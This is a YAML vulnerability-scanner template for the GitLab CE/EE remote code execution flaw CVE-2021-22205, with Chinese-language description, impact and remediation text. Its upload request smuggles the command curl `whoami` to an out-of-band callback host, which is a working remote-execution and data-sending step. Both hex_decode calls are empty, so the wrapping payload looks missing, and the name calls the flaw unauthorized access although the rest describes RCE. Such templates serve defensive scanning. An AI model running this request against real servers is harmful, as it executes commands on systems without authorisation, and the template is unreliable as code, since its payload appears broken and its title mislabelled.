id: gitlab-rce

info:
  name: GitLab CE/EE - 未授权访问漏洞
  author: pdteam
  severity: critical
  description: |
    该模板用于检测 GitLab CE/EE - 未授权访问漏洞。该类漏洞通常允许攻击者通过可控参数、接口调用或危险功能在目标服务端执行命令或代码。模板主要向 `/users/sign_in`、`/uploads/user` 等路径发送探测请求，并根据响应中的 `Failed to process image` 等特征确认漏洞是否存在。
  impact: |
    - 攻击者可在目标服务权限下执行系统命令或应用代码，读取、修改业务数据并部署持久化后门。
    - 若服务运行在高权限账户或可访问内网资源，漏洞可能进一步导致主机失陷和横向移动。
  remediation: |
    - 升级受影响产品到厂商修复版本，或应用官方补丁/安全配置基线。
    - 限制相关管理接口、调试接口或危险功能的访问来源，避免直接暴露到公网。
    - 排查异常进程、计划任务、WebShell、新增账号和外联记录，并轮换可能泄露的密钥与凭据。
  reference:
    - https://security.humanativaspa.it/gitlab-ce-cve-2021-22205-in-the-wild/
    - https://hackerone.com/reports/1154542
    - https://nvd.nist.gov/vuln/detail/CVE-2021-22205
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10
    cve-id: CVE-2021-22205
    cwe-id: CWE-77,CWE-78
    cpe: cpe:2.3:a:gitlab:gitlab:*:*:*:*:enterprise:*:*:*
  metadata:
    max-request: 2
    shodan-query: http.title:"GitLab"
    product: gitlab
    vendor: gitlab
  tags: oast,intrusive,hackerone,cve,cve2021,gitlab,rce,kev,vuln

http:
  - raw:
      - |
        GET /users/sign_in HTTP/1.1
        Host: {{Hostname}}
        Origin: {{BaseURL}}
      - |
        POST /uploads/user HTTP/1.1
        Host: {{Hostname}}
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryIMv3mxRg59TkFSX5
        X-CSRF-Token: {{csrf-token}}

        {{hex_decode('')}}curl `whoami`.{{interactsh-url}}{{hex_decode('')}}

    max-redirects: 3

    matchers-condition: and
    matchers:
      - type: word
        words:
          - 'Failed to process image'

      - type: status
        status:
          - 422

    extractors:
      - type: regex
        name: csrf-token
        internal: true
        group: 1
        regex:
          - 'csrf-token" content="(.*?)" />'

      - type: regex
        part: interactsh_request
        group: 1
        regex:
          - '([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z]+)'
